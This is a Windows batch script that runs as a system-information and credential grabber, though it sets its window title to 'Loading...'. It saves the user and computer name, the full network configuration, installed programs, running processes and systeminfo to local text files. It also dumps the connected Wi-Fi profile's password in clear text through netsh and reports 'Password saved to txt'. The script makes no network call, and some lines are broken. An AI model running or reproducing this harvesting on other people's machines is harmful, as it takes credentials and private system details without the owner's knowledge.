@echo off
:: header
cd header && type header.txt
cd ..\..
echo.
cd .main/info
:: config
echo Executed on [%computername%] by [%username%] on [%date%] at [%time%] with [Windows [ver%ver%] ] > .%computername%
title Loading...
for /f "tokens=*" %%a in ('wmic cpu get name^,numberofcores^,numberoflogicalprocessors') do set "cpu=%%a"
SETLOCAL ENABLEDELAYEDEXPANSION
set lang=%SystemRoot%\System32\wbem\wmic.exe os get locale
:: Get all IP
set timestamp=%date%
set "file=IP_output_all_%timestamp%.txt"
ipconfig /all > %file%
@ping -n 1 localhost> nul
echo [*] ^> Ipv4 was copied
@ping -n 1 localhost> nul
echo [*] ^> Ipv6 was copied
@ping -n 1 localhost> nul
echo [*] ^> Other Information has been copied
:: Attemps to Copy Wifi Password
for /f "tokens=2 delims=:" %%a in ('netsh interface show interface^|findstr /i "Connected"') do set "name=%%a"
set timestamp=%date%
set "file=Wlan_output_%timestamp%.txt"
netsh wlan show profile %name% key=clear >> output_%datetime%.txt > %file%
echo [*] ^> Password saved to txt
:: List installed programmes
set timestamp=%date%
set "file=Programms_output_%timestamp%.txt"
winget list > %file%
echo [*] ^> Listed programms to txt
:: List running processes
set timestamp=%date%
set "file=Running_output_%timestamp%.txt"
tasklist > %file%
echo [*] ^> Listed processes to txt
:: List Pc components 
set timestamp=%date%
set "file=Components_output_%timestamp%.txt"
systeminfo > %file%
echo [*] ^> Components saved to txt
pause











































































































              























































